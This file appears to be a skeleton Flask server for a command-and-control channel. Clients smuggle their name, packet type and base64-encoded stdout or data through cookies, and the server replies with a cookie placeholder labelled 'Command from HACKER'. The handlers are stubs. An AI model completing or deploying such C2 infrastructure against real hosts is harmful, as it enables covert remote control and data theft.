from flask import Flask, request, Response

from client import Client
from threading import Lock
import base64

app = Flask(__name__)

CLIENTS = dict()
CLIENTS_LOCK = Lock()

@app.route("/api")
def communicate():
    req_header = request.headers
    req_cookies = request.cookies
    
    
    client_name = req_cookies.get('0')
    packet_id = req_cookies.get('1')
    packet_type = req_cookies.get('2')
    packet_data = req_cookies.get('3')
    
    print(f"{client_name} - {packet_id} - {packet_type} - {packet_data} <=> {base64.b64decode(packet_data)}")

# if id missing request again

    if packet_type == 'stdout':
        pass

    elif packet_type == 'data':
        pass

    resp = Response()
    resp.set_cookie("0", "Command from HACKER", httponly=True)
    
    return resp

def communication_server_main(CLIENTS: Client, CLIENTS_LOCK: Lock):
    CLIENTS = CLIENTS
    CLIENTS_LOCK = CLIENTS_LOCK

    app.run("127.0.0.1", 8080, debug=True)

if __name__ == '__main__':
    communication_server_main([], Lock())